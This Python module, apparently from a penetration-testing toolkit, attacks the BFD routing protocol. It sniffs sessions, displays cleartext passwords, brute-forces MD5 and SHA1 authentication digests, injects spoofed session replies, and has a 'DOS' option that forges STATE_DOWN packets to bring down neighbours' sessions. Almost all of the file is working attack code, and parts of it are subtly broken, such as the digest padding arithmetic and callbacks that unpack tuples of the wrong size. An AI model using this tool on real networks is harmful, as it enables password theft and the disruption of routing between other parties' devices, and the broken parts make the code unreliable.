#       module_bfd.py
#       
#       Copyright 2010 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import random
import struct
import tempfile
import threading
import hashlib
import time

import dnet
import dpkt

gobject = None
gtk = None
urwid = None

BFD_VERSION = 1
BFD_PORT = 3784

class bfd_control_packet(object):

    DIAG_NO = 0             #No Diagnostic
    DIAG_TIME_EXP = 1       #Control Detection Time Expired
    DIAG_ECHO_FAIL = 2      #Echo Function Failed
    DIAG_NEIGH_DOWN = 3     #Neighbor Signaled Session Down
    DIAG_FORW_RST = 4       #Forwarding Plane Reset
    DIAG_PATH_DOWN = 5      #Path Down
    DIAG_CONC_PATH_DOWN = 6 #Concatenated Path Down
    DIAG_ADMIN_DOWN = 7     #Administratively Down
    DIAG_REV_PATH_DOWN = 8  #Reverse Concatenated Path Down

    diag_to_str = { DIAG_NO             : "DIAG_NO",
                    DIAG_TIME_EXP       : "DIAG_TIME_EXP",
                    DIAG_ECHO_FAIL      : "DIAG_ECHO_FAIL",
                    DIAG_NEIGH_DOWN     : "DIAG_NEIGH_DOWN",
                    DIAG_FORW_RST       : "DIAG_FORW_RST",
                    DIAG_PATH_DOWN      : "DIAG_PATH_DOWN",
                    DIAG_CONC_PATH_DOWN : "DIAG_CONC_PATH_DOWN",
                    DIAG_ADMIN_DOWN     : "DIAG_ADMIN_DOWN",
                    DIAG_REV_PATH_DOWN  : "DIAG_REV_PATH_DOWN"
                    }

    STATE_ADMIN_DOWN = 0
    STATE_DOWN = 1
    STATE_INIT = 2
    STATE_UP = 3

    state_to_str = {    STATE_ADMIN_DOWN    : "STATE_ADMIN_DOWN",
                        STATE_DOWN          : "STATE_DOWN",
                        STATE_INIT          : "STATE_INIT",
                        STATE_UP            : "STATE_UP"
                        }

    FLAG_POLL = 0x20
    FLAG_FINAL = 0x10
    FLAG_INDEPEND = 0x8
    FLAG_AUTH = 0x4
    FLAG_DEMAN = 0x2
    FLAG_MULTIPOINT = 0x1

    #~ 0                   1                   2                   3
    #~ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |Vers |  Diag   |Sta|P|F|C|A|D|M|  Detect Mult  |    Length     |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                       My Discriminator                        |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                      Your Discriminator                       |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                    Desired Min TX Interval                    |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                   Required Min RX Interval                    |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                 Required Min Echo RX Interval                 |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    def __init__(self, diag=None, state=None, flags=None, multiplier=None, my_discrim=None, your_discrim=None, des_min_tx=None, req_min_rx=None, req_min_echo=None, auth=None):
        self.diag = diag
        self.state = state
        self.flags = flags
        self.multiplier = multiplier
        self.my_discrim = my_discrim
        self.your_discrim = your_discrim
        self.des_min_tx = des_min_tx
        self.req_min_rx = req_min_rx
        self.req_min_echo = req_min_echo
        self.auth = auth

    def render(self, crack=False):
        vers_diag = (BFD_VERSION << 5) + (self.diag & 0x1F)
        state_flags = (self.state << 6) + (self.flags & 0x3F)
        length = 24 + len(self.auth)
        packet = struct.pack("!BBBBLLLLL", vers_diag, state_flags, self.multiplier, length, self.my_discrim, self.your_discrim, self.des_min_tx, self.req_min_rx, self.req_min_echo)
        auth = ""
        if self.flags and self.flags & self.FLAG_AUTH and self.auth:
            auth = self.auth.render(packet, crack)
        return packet + auth
        
    def parse(self, data):
        (vers_diag, state_flags, self.multiplier, length, self.my_discrim, self.your_discrim, self.des_min_tx, self.req_min_rx, self.req_min_echo) = struct.unpack("!BBBBLLLLL", data[:24])
        self.version = vers_diag >> 5
        self.diag = vers_diag & 0x1F
        self.state = state_flags >> 6
        self.flags = state_flags & 0x3F
        if self.flags & self.FLAG_AUTH:
            self.auth = bfd_auth()
            self.auth.parse(data[24:])

class bfd_auth(object):

    TYPE_RESERVED = 0
    TYPE_SIMPLE = 1
    TYPE_KEYED_MD5 = 2
    TYPE_METRIC_MD5 = 3
    TYPE_KEYED_SHA1 = 4
    TYPE_METRIC_SHA1 = 5
    
    type_to_str = { TYPE_RESERVED   : "TYPE_RESERVED",
                    TYPE_SIMPLE     : "TYPE_SIMPLE",
                    TYPE_KEYED_MD5  : "TYPE_KEYED_MD5",
                    TYPE_METRIC_MD5 : "TYPE_METRIC_MD5",
                    TYPE_KEYED_SHA1 : "TYPE_KEYED_SHA1",
                    TYPE_METRIC_SHA1: "TYPE_METRIC_SHA1"
                    }
      
    #~  0                   1                   2                   3
    #~  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #~ |   Auth Type   |   Auth Len    |    Authentication Data...     |
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    def __init__(self, type=None, keyid=None, sequence=None, data=None):
        self.type = type
        self.keyid = keyid
        self.sequence = sequence
        self.data = data

    def __len__(self):
        if self.type == self.TYPE_SIMPLE:
            return len(self.data) + 3
        elif self.type == self.TYPE_KEYED_MD5 or self.type == self.TYPE_METRIC_MD5:
            return 24
        elif self.type == self.TYPE_KEYED_SHA1 or self.type == self.TYPE_METRIC_SHA1:
            return 28
        else:
            return 0

    def render(self, packet, crack=False):
        if self.type == self.TYPE_SIMPLE:
    #~ 0                   1                   2                   3
    #~ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |   Auth Type   |   Auth Len    |  Auth Key ID  |  Password...  |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                              ...                              |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            return struct.pack("!BBB", self.type, 3 + len(self.data), self.keyid) + self.data
        elif self.type == self.TYPE_KEYED_MD5 or self.type == self.TYPE_METRIC_MD5:
    #~ 0                   1                   2                   3
    #~ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |   Auth Type   |   Auth Len    |  Auth Key ID  |   Reserved    |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                        Sequence Number                        |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                      Auth Key/Digest...                       |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                              ...                              |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            if not crack:
                digest = hashlib.md5()
                digest.update(packet)
                tmp = struct.pack("!BBBxI", self.type, 8 + 16, self.keyid, self.sequence) + self.data + b"\x00" * 16 - len(self.data)
                digest.update(tmp)
                tmp = digest.digest()
                return struct.pack("!BBBxI", self.type, 8 + len(tmp), self.keyid, self.sequence) + tmp
            else:
                return struct.pack("!BBBxI", self.type, 8 + 16, self.keyid, self.sequence)
        elif self.type == self.TYPE_KEYED_SHA1 or self.type == self.TYPE_METRIC_SHA1:
    #~ 0                   1                   2                   3
    #~ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |   Auth Type   |   Auth Len    |  Auth Key ID  |   Reserved    |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                        Sequence Number                        |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                       Auth Key/Hash...                        |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   #~ |                              ...                              |
   #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            if not crack:
                digest = hashlib.sha1()
                digest.update(packet)
                tmp = struct.pack("!BBBxI", self.type, 8 + 20, self.keyid, self.sequence) + self.data + b"\x00" * 20 - len(self.data)
                digest.update(tmp)
                tmp = digest.digest()
                return struct.pack("!BBBxI", self.type, 8 + len(tmp), self.keyid, self.sequence) + tmp
            else:
                return struct.pack("!BBBxI", self.type, 8 + 20, self.keyid, self.sequence)
        else:
            return b""

    def parse(self, data):
        (self.type, self.length) = struct.unpack("!BB", data[:2])
        if self.type == self.TYPE_SIMPLE:
            self.keyid, = struct.unpack("!B", data[2:3])
            self.data = data[3:self.length]
        elif self.type > self.TYPE_SIMPLE:
            (self.keyid, self.sequence) = struct.unpack("!BxI", data[2:8])
            self.data = data[8:self.length]

class bfd_bf(threading.Thread):
    def __init__(self, parent, ident, digest, data, threads):
        self.parent = parent
        self._ident = ident
        self.digest = digest
        packet = bfd_control_packet()
        packet.parse(data)
        self.data = packet.render(True)
        self.threads = threads
        self.obj = None
        threading.Thread.__init__(self)

    def run(self):
        if self.parent.platform == "Windows":
            import bf
        else:
            from loki_bindings import bf
        l = self.parent.parent
        self.obj = bf.bfd_md5_bf()
        self.obj.num_threads = l.bruteforce_threads
        if not l.bruteforce:
            self.obj.mode = bf.MODE_WORDLIST
            self.obj.wordlist = l.wordlist
        else:
            if not l.bruteforce_full:
                self.obj.mode = bf.MODE_ALPHANUM
            else:
                self.obj.mode = bf.MODE_FULL
        self.obj.pre_data = self.data
        self.obj.hash_data = self.digest

        self.obj.start()
        while self.obj.running:
            time.sleep(0.01)        
        
        if self.parent.ui == 'urw':
            (iter, discrim, answer, dos, crack, data, _) = self.parent.neighbors[self._ident]
            button = iter[0]
            label = button.base_widget.get_label()
            if self.obj.pw != None:
                label += " PASS(%s)" % self.obj.pw
            else:
                label += " NO_PASSWORD_FOUND"
            button.base_widget.set_label(label)
            button.set_attr_map({None : "button normal"})
            self.parent.neighbors[self._ident] = (iter, discrim, answer, dos, crack, data, self.obj.pw)
        elif self.parent.ui == 'gtk':
            with gtk.gdk.lock:
                if self.parent.neighbor_liststore.iter_is_valid(self.iter):
                    src = self.parent.neighbor_liststore.get_value(self.iter, self.parent.NEIGH_IP_ROW)
                    if self.obj.pw != None:
                        self.parent.neighbor_liststore.set_value(self.iter, self.parent.NEIGH_CRACK_ROW, self.obj.pw)
                        self.parent.log("BFD: Found password '%s' for host %s" % (self.obj.pw, src))
                    else:
                        self.parent.neighbor_liststore.set_value(self.iter, self.parent.NEIGH_CRACK_ROW, "NOT FOUND")
                        self.parent.log("BFD: No password found for host %s" % (src))

    def quit(self):
        if not self.obj is None:
            self.obj.stop()
            self.obj = None

class mod_class(object):
    NEIGH_SRC_ROW = 0
    NEIGH_DST_ROW = 1
    NEIGH_STATE_ROW = 2
    NEIGH_DIAG_ROW = 3
    NEIGH_AUTH_ROW = 4
    NEIGH_ANSWER_ROW = 5
    NEIGH_DOS_ROW = 6
    
    def __init__(self, parent, platform, ui):
        self.parent = parent
        self.platform = platform
        self.name = "bfd"
        self.group = "HOT-STANDBY"
        self.gladefile = "/modules/module_bfd.glade"
        self.ui = ui
        if self.ui == 'gtk':
            import gobject as gobject_
            import gtk as gtk_
            import gtk.glade as glade_
            global gobject
            global gtk
            gobject = gobject_
            gtk = gtk_
            gtk.glade = glade_
            self.neighbor_treestore = gtk.TreeStore(str, str, str, str, str, bool, bool)
        elif self.ui == 'urw':
            import urwid as urwid_
            global urwid
            urwid = urwid_
        self.neighbors = {}
        self.filter = False

    def start_mod(self):
        self.neighbors = {}
        self.auto_answer = False
        if self.ui == 'gtk':
            self.filter_checkbutton.set_active(False)
        elif self.ui == 'urw':
            self.filter_checkbox.set_state(False)
        
    def shut_mod(self):
        if self.ui == 'gtk':
            self.neighbor_treestore.clear()
        elif self.ui == 'urw':
            if not self.hostlist is None:
                for i in self.hostlist:
                    self.hostlist.remove(i)
        if self.filter:
            self.deactivate_filter()
            if self.ui == 'gtk':
                self.filter_checkbutton.set_active(False)
            elif self.ui == 'urw':
                self.answer_checkbox.set_state(False)
        for id in self.neighbors:
            (iter, discrim, answer, dos, crack, data, password) = self.neighbors[id]
            if crack:
                crack.quit()

    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_auto_answer_checkbutton_toggled" : self.on_auto_answer_checkbutton_toggled,
                "on_filter_checkbutton_toggled" : self.on_filter_checkbutton_toggled
                }
        self.glade_xml.signal_autoconnect(dic)

        self.neighbor_treeview = self.glade_xml.get_widget("neighbor_treeview")
        self.neighbor_treeview.set_model(self.neighbor_treestore)
        self.neighbor_treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("SRC")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.NEIGH_SRC_ROW)
        self.neighbor_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("DST")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.NEIGH_DST_ROW)
        self.neighbor_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("STATE")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.NEIGH_STATE_ROW)
        self.neighbor_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("DIAG")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.NEIGH_DIAG_ROW)
        self.neighbor_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("AUTH")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.NEIGH_AUTH_ROW)
        self.neighbor_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("ANSWER")
        render_toggle = gtk.CellRendererToggle()
        render_toggle.set_property('activatable', True)
        render_toggle.connect('toggled', self.answer_toggle_callback, self.neighbor_treestore)
        column.pack_start(render_toggle, expand=False)
        column.add_attribute(render_toggle, "active", self.NEIGH_ANSWER_ROW)
        self.neighbor_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("DOS")
        render_toggle = gtk.CellRendererToggle()
        render_toggle.set_property('activatable', True)
        render_toggle.connect('toggled', self.dos_toggle_callback, self.neighbor_treestore)
        column.pack_start(render_toggle, expand=False)
        column.add_attribute(render_toggle, "active", self.NEIGH_DOS_ROW)
        self.neighbor_treeview.append_column(column)

        self.auto_answer_checkbutton = self.glade_xml.get_widget("auto_answer_checkbutton")
        self.filter_checkbutton = self.glade_xml.get_widget("filter_checkbutton")
        self.secret_entry = self.glade_xml.get_widget("secret_entry")

        return self.glade_xml.get_widget("root")
        
    def get_urw(self):
        hostlist = [ urwid.AttrMap(urwid.Text("Hostlist"), 'header'), urwid.Divider() ]
        self.hostlist = urwid.SimpleListWalker(hostlist)
        hostlist = urwid.LineBox(urwid.ListBox(self.hostlist))
        self.answer_checkbox = urwid.CheckBox("Auto answer requests", on_state_change=self.urw_autoanswer_checkbox_changed)
        self.filter_checkbox = urwid.CheckBox("Activate packetfilter", on_state_change=self.urw_filter_checkbox_changed) 
        self.pile = urwid.Pile([('weight', 10, hostlist), urwid.Filler(self.answer_checkbox), urwid.Filler(self.filter_checkbox)])
        return self.pile
    
    def urw_autoanswer_checkbox_changed(self, box, state):
        self.auto_answer = state
    
    def urw_filter_checkbox_changed(self, box, state):
        if state:
            self.activate_filter()
        else:
            self.deactivate_filter()
    
    def urw_answer_checkbox_changed(self, box, state, id):
        (iter, discrim, answer, dos, crack, data, password) = self.neighbors[id]
        if state:
            (button, answer_c, dos_c) = iter
            dos = False
            dos_c.set_state(False)
        self.neighbors[id] = (iter, discrim, state, dos, crack, data, password)
    
    def urw_dos_checkbox_changed(self, box, state, id):
        (iter, discrim, answer, dos, crack, data, password) = self.neighbors[id]
        if state:
            (button, answer_c, dos_c) = iter
            answer = False
            answer_c.set_state(False)
        self.neighbors[id] = (iter, discrim, answer, state, crack, data, password)
    
    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def set_dnet(self, dnet):
        self.dnet = dnet

    def set_fw(self, fw):
        self.fw = fw

    def set_int(self, interface):
        self.interface = interface
        self.bfd_filter = {     "device"    : self.interface,
                                "op"        : dnet.FW_OP_BLOCK,
                                "dir"       : dnet.FW_DIR_IN,
                                "proto"     : dpkt.ip.IP_PROTO_UDP,
                                "src"       : dnet.addr("0.0.0.0/0", dnet.ADDR_TYPE_IP),
                                "dst"       : dnet.addr("0.0.0.0/0", dnet.ADDR_TYPE_IP),
                                "sport"     : [0, 0],
                                "dport"     : [BFD_PORT, BFD_PORT]
                                }

    def get_udp_checks(self):
        return (self.check_udp, self.input_udp)

    def check_udp(self, udp):
        if udp.dport == BFD_PORT:
            return (True, True)
        return (False, False)            

    def input_udp(self, eth, ip, udp, timestamp):
        packet = bfd_control_packet()
        packet.parse(udp.data)
        src = dnet.ip_ntoa(ip.src)
        dst = dnet.ip_ntoa(ip.dst)
        id = "%s:%s" % (src, dst)
        id_rev = "%s:%s" % (dst, src)
        auth = "None"
        if packet.flags & bfd_control_packet.FLAG_AUTH:
            auth = bfd_auth.type_to_str[packet.auth.type]
        password = ""
        if packet.flags & bfd_control_packet.FLAG_AUTH and packet.auth.type == bfd_auth.TYPE_SIMPLE:
            password = packet.auth.data
        if id not in self.neighbors and id_rev not in self.neighbors:
            self.activate_filter()
            if self.ui == 'gtk':
                self.filter_checkbutton.set_active(True)
            elif self.ui == 'urw':
                self.filter_checkbox.set_state(True)
            self.log("BFD: got new session: %s -> %s" % (src, dst))
            if self.ui == 'gtk':
                iter = self.neighbor_treestore.append(None, [src, dst, bfd_control_packet.state_to_str[packet.state], bfd_control_packet.diag_to_str[packet.diag], auth, self.auto_answer, False])
            elif self.ui == 'urw':
                label = "%s - %s %s %s AUTH(%s)" % (src, dst, bfd_control_packet.state_to_str[packet.state], bfd_control_packet.diag_to_str[packet.diag], auth)
                if password != "":
                    label += " PASS(%s)" % password
                answer_c = urwid.CheckBox("Answer", self.auto_answer, on_state_change=self.urw_answer_checkbox_changed, user_data=id)
                dos_c = urwid.CheckBox("DOS", False, on_state_change=self.urw_dos_checkbox_changed, user_data=id)
                if not auth == "None":
                    button = self.parent.menu_button(label, self.crack_activated, id)
                else:
                    button = self.parent.menu_button(label)
                self.hostlist.append(urwid.Columns([('weight', 4, button), answer_c, dos_c]))
                iter = (button, answer_c, dos_c)
            self.neighbors[id] = (iter, random.randint(0x1, 0x7fffffff), self.auto_answer, False, False, udp.data, password)
        if id in self.neighbors:
            (iter, discrim, answer, dos, crack, data, password) = self.neighbors[id]
            if self.ui == 'gtk':
                if self.neighbor_treestore.iter_is_valid(iter):
                    self.neighbor_treestore.set_value(iter, self.NEIGH_STATE_ROW, bfd_control_packet.state_to_str[packet.state])
                    self.neighbor_treestore.set_value(iter, self.NEIGH_DIAG_ROW, bfd_control_packet.diag_to_str[packet.diag])
            elif self.ui == 'urw':
                (button, answer_c, dos_c) = iter
                label = "%s - %s %s %s AUTH(%s)" % (src, dst, bfd_control_packet.state_to_str[packet.state], bfd_control_packet.diag_to_str[packet.diag], auth)
                if password != "":
                    label += " PASS(%s)" % password
                button.base_widget.set_label(label)
            if answer and packet.diag == bfd_control_packet.DIAG_NO:
                if packet.state == bfd_control_packet.STATE_DOWN:
                    packet.state = bfd_control_packet.STATE_INIT
                packet.your_discrim = packet.my_discrim
                packet.my_discrim = discrim
                packet.req_min_echo = 0
                udp_hdr = dpkt.udp.UDP( dport=BFD_PORT,
                                        sport=31337,
                                        data=packet.render()
                                        )
                udp_hdr.ulen += len(udp_hdr.data)
                ip_hdr = dpkt.ip.IP(    ttl=255,
                                        tos=0xC0,
                                        p=dpkt.ip.IP_PROTO_UDP,
                                        src=ip.dst,
                                        dst=ip.src,
                                        data=str(udp_hdr)
                                        )
                ip_hdr.len += len(ip_hdr.data)
                eth_hdr = dpkt.ethernet.Ethernet(   dst=eth.src,
                                                    src=eth.dst,
                                                    type=dpkt.ethernet.ETH_TYPE_IP,
                                                    data=str(ip_hdr)
                                                    )
                self.dnet.send(str(eth_hdr))
            elif dos and packet.state > bfd_control_packet.STATE_DOWN:
                packet.state = bfd_control_packet.STATE_DOWN
                tmp = packet.your_discrim
                packet.your_discrim = packet.my_discrim
                packet.my_discrim = tmp
                udp_hdr = dpkt.udp.UDP( dport=udp.dport,
                                        sport=udp.sport,
                                        data=packet.render()
                                        )
                udp_hdr.ulen += len(udp_hdr.data)
                ip_hdr = dpkt.ip.IP(    ttl=255,
                                        tos=0xC0,
                                        p=dpkt.ip.IP_PROTO_UDP,
                                        src=ip.dst,
                                        dst=ip.src,
                                        data=str(udp_hdr)
                                        )
                ip_hdr.len += len(ip_hdr.data)
                eth_hdr = dpkt.ethernet.Ethernet(   dst=eth.src,
                                                    src=eth.dst,
                                                    type=dpkt.ethernet.ETH_TYPE_IP,
                                                    data=str(ip_hdr)
                                                    )
                self.dnet.send(str(eth_hdr))

    def activate_filter(self):
        if not self.filter:
            self.log("BFD: Setting lokal packet filter for BFD")
            if self.platform == "Linux":
                os.system("iptables -A INPUT -i %s -p udp --dport %d -j DROP" % (self.interface, BFD_PORT))
            elif self.platform == "Darwin":
                os.system("ipfw -q add 31336 deny udp from any to any %d" % (BFD_PORT))
            elif self.platform == "Windows":
                os.system("netsh advfirewall firewall add rule name=bfd dir=in protocol=UDP localport=%d action=block" % BFD_PORT)
            else:
                self.fw.add(self.bfd_filter)
            self.filter = True
    
    def deactivate_filter(self):
        if self.filter:
            self.log("BFD: Removing lokal packet filter for BFD")
            if self.platform == "Linux":
                os.system("iptables -D INPUT -i %s -p udp --dport %d -j DROP" % (self.interface, BFD_PORT))
            elif self.platform == "Darwin":
                os.system("ipfw -q delete 31336")
            elif self.platform == "Windows":
                os.system("netsh advfirewall firewall del rule name=bfd")
            else:
                self.fw.delete(self.bfd_filter)
            self.filter = False

    def answer_toggle_callback(self, cell, path, model):            
        model[path][self.NEIGH_ANSWER_ROW] = not model[path][self.NEIGH_ANSWER_ROW]
        id = "%s:%s" % (model[path][self.NEIGH_SRC_ROW], model[path][self.NEIGH_DST_ROW])
        (iter, discrim, answer, dos) = self.neighbors[id]
        if model[path][self.NEIGH_ANSWER_ROW] and model[path][self.NEIGH_DOS_ROW]:
            model[path][self.NEIGH_DOS_ROW] = False
            dos = False
        self.neighbors[id] = (iter, discrim, model[path][self.NEIGH_ANSWER_ROW], dos)
        
    def dos_toggle_callback(self, cell, path, model):
        model[path][self.NEIGH_DOS_ROW] = not model[path][self.NEIGH_DOS_ROW]
        id = "%s:%s" % (model[path][self.NEIGH_SRC_ROW], model[path][self.NEIGH_DST_ROW])
        (iter, discrim, answer, dos) = self.neighbors[id]
        if model[path][self.NEIGH_DOS_ROW] and model[path][self.NEIGH_ANSWER_ROW]:
            model[path][self.NEIGH_ANSWER_ROW] = False
            answer = False
        self.neighbors[id] = (iter, discrim, answer, model[path][self.NEIGH_DOS_ROW])

    def crack_activated(self, button, ident):
        (iter, discrim, answer, dos, crack, data, password) = self.neighbors[ident]
        if not crack:
            packet = bfd_control_packet()
            packet.parse(data)
            digest = packet.auth.data
            src = ident.split(":")[0]
            dst = ident.split(":")[1]
            packet = bfd_control_packet()
            packet.parse(data)
            auth = "None"
            if packet.flags & bfd_control_packet.FLAG_AUTH:
                auth = bfd_auth.type_to_str[packet.auth.type]
            label = "%s - %s %s %s AUTH(%s)" % (src, dst, bfd_control_packet.state_to_str[packet.state], bfd_control_packet.diag_to_str[packet.diag], auth)
            button.base_widget.set_label(label)
            if self.ui == "urw":
                crack = bfd_bf(self, ident, digest, data, self.parent.bruteforce_threads)
            crack.start()
            iter[0].set_attr_map({None : "button select"})
        else:
            crack.quit()
            crack = False
            iter[0].set_attr_map({None : "button normal"})
        self.neighbors[ident] = (iter, discrim, answer, dos, crack, data, password)

    # SIGNALS #

    def on_auto_answer_checkbutton_toggled(self, btn):
        self.auto_answer = btn.get_active()

    def on_filter_checkbutton_toggled(self, btn):
        if btn.get_active():
            self.activate_filter()
        else:
            self.deactivate_filter()
